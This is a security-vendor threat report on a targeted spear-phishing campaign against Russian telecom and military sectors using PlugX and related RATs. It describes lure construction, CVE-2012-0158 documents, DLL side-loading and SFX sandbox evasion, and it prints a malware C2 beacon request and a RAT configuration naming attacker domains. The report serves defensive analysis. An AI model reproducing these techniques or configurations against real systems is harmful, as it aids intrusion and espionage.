In Pursuit of Optical Fibers and Troop Intel:
Targeted Attack Distributes PlugX in Russia

By Thoufique Haq & Aleksey F
Proofpoint researchers recently observed a campaign targeting telecom and military in
Russia. Beginning in July 2015 (and possibly earlier), the attack continued into August and is
currently ongoing. As a part of this campaign, we also observed attacks on Russian-speaking
financial analysts working at global financial firms and covering telecom corporations in
Russia, likely a result of collateral damage caused by the attackers targeting tactics.
The attacks employed PlugX, a Remote Access Trojan (RAT) widely used in targeted attacks.
Proofpoint is tracking this attacker, believed to operate out of China, as TA459 . This same
attacker is also reported to have targeted various military installations in Central Asia in the
past (http://www.welivesecurity.com/2014/11/12/korplug-military-targeted-attacksafghanistan-tajikistan/) [1]. While the current campaign from this attacker has been active for
a couple of months, there is evidence of activity by this attacker as far back as 2013,
employing other backdoors such as Saker, Netbot and DarkStRat .
The attacks seen in the current campaign involved spear-phishing emails that employ both
exploit-laden Microsoft Word document attachments, as well as links leading to RAR archives.
The email contents, filenames and decoy are all usually in Russian.
1. Campaign Details: Attachments
The Microsoft Word document attachments observed in this campaign utilized CVE-2012-0158
to exploit the client and implant the PlugX RAT. For example, the attachment LTE-2600.doc
(SHA: 6ea86b944c8b5a9b02adc7aac80e0f33217b28103b70153710c1f6da76e36081) was sent
to financial analysts covering the telecom industry with the email Subject “Проект бизнесплана” (“Project business-plan”). The attachment name is suited to the targets because “LTE”
is a telecom term referring to Long-Term Evolution networks, typically used to describe 4G
networks.

Inspection of the document exploit employing CVE-2012-0158 also revealed that it was crafted
using a builder tool, which can be seen in various artifacts visible in the document properties.
(Fig.1) However, it should be noted that we do not believe that this builder is exclusively used
by this attacker and is likely shared among multiple threat actor groups.

Figure 1: Builder artifacts in exploit document
2. Campaign Details: URLs
As a part of this campaign, the attackers also sent spear-phishing emails with URLs to RAR
archive files hosted on fake domains registered for this campaign. An interesting fact that
shines some light on the social engineering tradecraft used by the group is that these domain
names as well as payload file names were not chosen at random, as is often the case, but
were instead chosen to fit the specific lure.
For example, the RAR archive hosted on www.forum-mil[.]net/news/2015-08-03-3001.rar
contained the executable file "Воздушно-космические силы России заступили на боевое
дежурство.exe” (“Aerospace Russian forces step up military duty.exe”). Additional searching
uncovered a news article with this title on a legitimate Russian-language news site:
http://www.forummil.ru/news/vozdushno_kosmicheskie_sily_rossii_zastupili_na_boevoe_dezhurstvo/2015-0803-3001 (http://www.forummil.ru/news/vozdushno_kosmicheskie_sily_rossii_zastupili_na_boevoe_dezhurstvo/2015-0803-3001): the malicious executable borrowed the name from the article title, and the site to
host the malware mimics the site that hosts the news article.
In another example, the news article http://tvzvezda.ru/news/forces/content/20150819145988tq.htm (http://tvzvezda.ru/news/forces/content/201508191459-88tq.htm) was used as the
basis for registering the payload hosting site
www[.]tvzvezda[.]net/news/forces/content/201508181025.rar. Again, the title of the article
was used as the name for the executable inside the RAR archive, and it appears that many of
these lures were created in a similar fashion. Specifically, the actor starts with an article
describing a military-related event and then registers a payload site and names the malware
file. Table 1 shows the full list of payload domains and sites they mimic. (A list of the payload
URLs can be found in the Indicators of Compromise section at the end of this post.)

Table 1: Details on domains hosting malicious RAR-archived PlugX executables
All the infection domains and command and control (C2) domains were registered using the
same registrar in Beijing: “Shanghai Meicheng Technology Information Development Co.,
Ltd.”. Other than the emails, the information used for registration was randomized.
The RAR archives hosted on fake domains contained RAR SFX (self-extracting executable)
packaged executables which drop and load PlugX. Proofpoint researchers observed the
following filenames being used for executables in the campaign:

2.1. Decoy Content and Sandbox Evasion
Interestingly, one of the RAR SFX droppers (SHA:
71be8bb45dfe360ee6076ed34fde12a382fe9d7922bd11b179ca773be12fa54c) launches a
decoy Microsoft Word document before launching the executable. (Fig 2) The contents of this
decoy document reference the “Tsar Bomba” nuclear test from the Cold War era and have
been directly lifted from a Russian site (http://inosmi.ru/russia/20150818/229690166.html).

Figure 2: Contents of decoy document referencing “Tsar Bomba”
In addition to displaying something potentially relevant to the recipient’s interests, the PlugX
payload is not executed by the RAR SXF until the victim closes the decoy Word document,
seen in the past as a sandbox evasion technique (https://www.proofpoint.com/us/threatinsight/post/Run-on-Close-Macros-Try-to-Shut-the-Door-on-Sandboxes) wherein the payload
is not executed until the decoy document is closed. As a result, the actual payload may never
execute in malware sandbox environments unless the sandbox is configured to simulate the
action of a user closing the decoy document. The SFX script for this document (Fig. 3) appears
to have been created with a Chinese language pack version of WinRAR. The decoy document
“1.doc” is executed first and waits until it is closed before launching “0810.exe”. This effect can
be easily achieved in WinRAR by setting the “Wait and return exit code” option when creating
the SFX archive.

3. PlugX Implant
The attachment and email campaigns both employed DLL side-loading
(https://attack.mitre.org/wiki/DLL_side-loading) techniques to load the PlugX payload. All of
the payloads used the same clean signed executable “fsguidll.exe”, masquerading as the Fsecure GUI component, to sideload “fslapi.dll” which in turn unpacks code from “fslapi.dll.gui”.

Figure 4: DLL sideloading masquerading as the F-secure GUI component
The variant of PlugX used is the P2P version that was described by JPCert
(http://blog.jpcert.or.jp/2015/01/analysis-of-a-r-ff05.html) [2]. A sample configuration
extracted using the volatility script from Arbor (https://github.com/arborjjones/volatility_plugins) [3] is shown below.

Many of the samples used the string “EEEEEE” for authentication of the C2 communication,
which is likely the default value. Other observed values include “LLL-0808”, “0abcde”, and “niii0701”.
4. Command and Control Infrastructure
We observed pressmil[.]com and notebookhk[.]net being used as the C2 servers for this
specific campaign. Over the duration of the campaign both of these domains pointed to the
same infrastructure on the IP address “43.252.175.119” in Hong Kong. This IP infrastructure
has been actively used by this attacker as early as 2014-12-04. The other domains also
registered to point to this same IP address include “fedpress[.]net” and “dicemention[.]com”,
which have been observed at use in past campaigns.
In addition, the C2 server notebookhk[.]net pointed to 123.254.104.50 multiple times between
2013-08-23 and 2014-09-29. Similarly dicemention[.]com pointed to this IP multiple times
between 2013-12-05 and 2014-09-28. There were multiple domains that used this same IP
infrastructure 123.254.104.50 in the past such as
business-isa.mynetav[.]org
business-rsa.onmypc[.]org
blacktan[.]cn
dicemention[.]com
leeghost[.]com
notebookhk[.]net
When investigating 123.254.104.50 we discovered additional, older payloads clustering in to
three different malware families. These additional malware families used by this attacker in
the past were Saker, Netbot and DarkStRat. Researchers at ESET also reported and
documented the usage of DarkStRat by this attacker [1].

The samples from the Saker cluster exhibited clues that also point to a Russian military attack
nexus. For example, the file “zamysel praticteskih dejstvi voisk.scr” (SHA:
556e7e944939929ca4d9ca6c54d9059edf97642ece1d84363f2d46e2e8ca72ae), translates to
“plan of army practice maneuvers.scr”. It was also similarly packaged in a RAR archive, and on
execution it drops and loads a DLL file “icwnet.dll” (SHA:
1a789568a53c18dab21c9c0386c746878cf8458e3369f0dc36a285fe296f3be3) which contains
the exports “ServiceMain” and “JustTempFun”. The malware makes the following beacon to a
remote server:
GET /30106C07000038FE0F00<removed>000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000
0100000<removed>000000000000000000000000000000000000000000000000000000
0000000000000000 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CL
R 1.1.4322)
Host: www.leeghost.com:1037
Cache-Control: no-cache

This backdoor has been analyzed extensively in the past [4] and provides the attacker a range
of functionality, including file manager (enumerate, create, copy, move, delete); the ability to
download and run secondary payloads; and deleting all traces of itself and shutting down.
4.2. Related Malware: Netbot (aka TornRat) Implant
When an example payload (SHA:
277fe4dab731149f3d40630f2f8b25092b007c701f04b5304d3ba9570280d015) from this
cluster is detonated, it drops and loads a DLL file “taskhost.dll” (SHA:
dd9d31c3acb4299619c2251698024da1ac9ec42280aa6c16cd2369907f3be4e3). The malware
sends an initial beacon to its C2 server (Fig. 5), which matches the TornRAT network signature
previously published by CrowdStrike [5].

Figure 5: Netbot network beacon
The scheme used to encrypt the beacon is a byte XOR with 0x3f followed by an addition with
0x3f. The encrypted beacon contains hostname, system memory, OS information and
infection timestamp. (Fig. 6)

Figure 6: Netbot network beacon decoded
Samples from this cluster were found creating the following mutexes.
Winlogin Running!
Netbot2012 Is Running!
NetBotServer Is Running!
It is worth noting that there is similarity in mutex naming scheme to another malware family
called NetTraveler (aka Travnet). Netbot is a backdoor and has commands to support features
similar noted above for Saker, such as file manager (enumerate, create, copy, move, delete),
ability to download and execute secondary payloads; and deleting all traces of itself.
4.3. Related Malware: DarkStRat implant
When an example payload (SHA:
b38aa09a2334e11a73ef9a926694f2054789934daa38afeb8d00bce6949b6c4c) from this
cluster is detonated it drops and runs an executable file “netlink.exe” (SHA:
b38aa09a2334e11a73ef9a926694f2054789934daa38afeb8d00bce6949b6c4c). The RAT sends
the string "ok\n" following initial beacon to a remote server. A configuration file
“netsetting.ini” is also written to disk with the following contents:
[Option]
HostPort=443
HostName=www.dicemention.com

DarkStRat is a full-fledged RAT written in Delphi with an array of features such as file
manager, process manager, registry manager, service manager, downloading and running
secondary payloads and deleting all traces of itself.
As also noted by the ESET researchers [1], the strings in this RAT strangely show Spanish
language origins, albeit with some Chinese connections. The source code for this RAT is
hosted on google code (https://code.google.com/p/darkstrat/) with the name “DarkStRat 2008
1.0开源.rar”. The string “开源.” in the name translates to “Open Source”. Various parts of the
source code also have strings in Chinese and reference “darkst[.]com” and “fsg2[.]cn”. The
owner of this Google-hosted code project is listed as darkteam...@gmail.com. As a result, it
can be inferred that code from a Spanish RAT was repurposed by malware author with

Chinese origins and marketed as DarkStRat, but as is often the case we should caution against
a definitive attribution based solely on characteristics such as language and C2 server
locations.
5. Conclusion
A detailed examination of this operation reveals an adversary who demonstrates a keen
interest in Russian telecom and military sectors, indicative of an actor with geopolitical
motives. The attacker adapts and evolves their Tactics, Techniques and Procedures (TTPs)
over time as the situation demands. While the attacker appears to do very little to hide their
tracks, they remain highly determined and persistent and have carried out attacks through a
sustained operation spanning at least two years, and possibly longer. The attacker also
invests time to research the locale and current events relevant to their targets and then
leverages this in their targeting tactics. Attacks such as these have become a constant
occurrence given the covert nature of digital attacks and easy access to targeting information
online.
As this threat shows, attackers continue to employ increasingly sophisticated techniques
against new targets in order to uncover and steal sensitive information. Organizations need to
recognize that they cannot rely on traditional antivirus and anti-spam solutions to detect and
stop these advanced threats. In order to combat targeted attacks, organizations should adopt
next-generation solutions that make it possible to identify and respond to sophisticated
targeted attacks by correlating advanced detection with threat intelligence about actor TTPs
and global views of threat traffic, including IOCs that enable response teams to quickly detect
and mitigate compromises. Moreover, a multi-layer approach is essential, with email security
representing the logical starting point for an advanced threat defense: like this targeted
attack, email remains the vector-of-choice for penetrating target organizations and delivering
these sophisticated payloads.
